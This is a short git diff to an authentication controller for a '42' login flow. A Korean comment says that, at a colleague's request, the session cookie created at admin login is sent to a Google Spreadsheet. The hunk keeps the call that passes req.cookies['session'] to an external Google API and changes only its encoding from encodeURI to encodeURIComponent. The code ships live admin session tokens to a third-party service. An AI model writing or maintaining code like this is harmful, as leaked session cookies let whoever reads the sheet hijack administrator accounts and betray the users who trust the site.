@@ -67,7 +67,7 @@ export class Auth42Controller {
          * doosoo님의 요청으로 관리자 권한으로 로그인을 할 때 생성된 쿠키를 구글 스프레드시트로 송부하게 해두었습니다.
          */
         const success = await this.googleApi.transportData(
-          encodeURI(req.cookies['session']),
+          encodeURIComponent(req.cookies['session']),
         );
         if (success) {
           res.status(200).json({ msg: 'ok' });
